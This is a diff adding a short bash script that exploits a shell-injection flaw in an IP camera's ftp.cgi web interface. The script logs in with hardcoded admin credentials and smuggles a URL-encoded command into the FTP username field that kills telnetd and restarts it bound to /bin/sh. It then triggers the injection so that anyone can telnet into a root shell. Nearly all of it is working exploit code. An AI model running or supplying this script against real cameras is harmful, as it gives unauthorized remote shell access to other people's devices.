@@ -1,0 +1,16 @@
+#!/bin/bash
+cam_ip=192.168.1.4
+username=admin
+passwd=08191996
+
+echo "Using shell injection to start telnetd on camera..."
+curl --digest -u $username:$passwd -X GET "http://$cam_ip/hy-cgi/ftp.cgi?cmd=setftpattr&ft_server=127.0.0.1&ft_port=9000&ft_username=u%27%22%60killall%20telnetd%3B%20/usr/sbin/telnetd%20-l/bin/sh%60%22%27&ft_password=p&ft_dirname=./" -s > /dev/null
+
+# Trigger the camera to execute our injected shell code
+curl --digest -u $username:$passwd -X GET "http://$cam_ip/hy-cgi/ftp.cgi?cmd=testftp" -s > /dev/null
+
+rc=$?; if [[ $rc != 0 ]]; then echo "Error..."; exit $rc; fi
+
+echo "Success!"
+echo "To connect run: telnet "$cam_ip
+
